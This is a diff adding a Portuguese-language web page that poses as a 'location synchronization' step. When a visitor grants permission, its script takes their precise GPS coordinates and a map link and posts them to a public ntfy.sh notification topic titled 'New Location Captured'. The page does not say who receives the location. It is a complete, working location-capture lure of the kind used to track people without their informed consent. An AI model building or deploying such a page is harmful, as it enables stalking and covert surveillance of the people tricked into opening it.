@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sincronização de Localização</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            background-color: #f4f4f9; 
+            margin: 0; 
+        }
+        .container { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 10px; 
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        #status { 
+            margin-top: 20px; 
+            font-weight: bold; 
+            color: #555;
+        }
+        .spinner {
+            margin: 15px auto;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>📍 Atualização de Localização</h2>
+        <p>Por favor, permita o acesso à sua localização no navegador quando solicitado.</p>
+        <div id="loader" class="spinner"></div>
+        <div id="status">Aguardando permissão do usuário...</div>
+    </div>
+
+    <script>
+        const statusDiv = document.getElementById('status');
+        const loader = document.getElementById('loader');
+        const ntfyUrl = 'https://ntfy.sh/bolivianos498';
+
+        function hideLoader() {
+            loader.style.display = 'none';
+        }
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    const message = `Nova localização registrada!\nLat: ${lat}\nLon: ${lon}\nMapa: ${mapsLink}`;
+
+                    statusDiv.textContent = "Coordenadas obtidas! Enviando...";
+                    statusDiv.style.color = "#f39c12";
+
+                    try {
+                        const response = await fetch(ntfyUrl, {
+                            method: 'POST',
+                            body: message,
+                            headers: {
+                                'Title': 'Nova Localização Capturada',
+                                'Tags': 'round_pushpin,world_map',
+                                'Priority': 'default'
+                            }
+                        });
+
+                        hideLoader();
+                        if (response.ok) {
+                            statusDiv.textContent = "Localização enviada com sucesso!";
+                            statusDiv.style.color = "#27ae60";
+                        } else {
+                            statusDiv.textContent = `Erro ao enviar: ${response.status}`;
+                            statusDiv.style.color = "#c0392b";
+                        }
+                    } catch (error) {
+                        hideLoader();
+                        statusDiv.textContent = "Erro de rede ao tentar contatar o servidor ntfy.";
+                        statusDiv.style.color = "#c0392b";
+                        console.error("Erro no fetch:", error);
+                    }
+                },
+                (error) => {
+                    hideLoader();
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            statusDiv.textContent = "Você negou a permissão de localização.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            statusDiv.textContent = "As informações de localização estão indisponíveis (GPS desligado ou sem sinal).";
+                            break;
+                        case error.TIMEOUT:
+                            statusDiv.textContent = "A requisição para obter a localização demorou tempo demais e expirou.";
+                            break;
+                        default:
+                            statusDiv.textContent = "Ocorreu um erro desconhecido ao obter o GPS.";
+                            break;
+                    }
+                    statusDiv.style.color = "#c0392b";
+                },
+                {
+                    enableHighAccuracy: true, // Força o uso do GPS em dispositivos móveis
+                    timeout: 15000,           // Tempo máximo de espera (15 segundos)
+                    maximumAge: 0             // Não aceita cache de localizações antigas
+                }
+            );
+        } else {
+            hideLoader();
+            statusDiv.textContent = "Geolocalização não é suportada pelo seu navegador.";
+            statusDiv.style.color = "#c0392b";
+        }
+    </script>
+
+</body>
+</html>
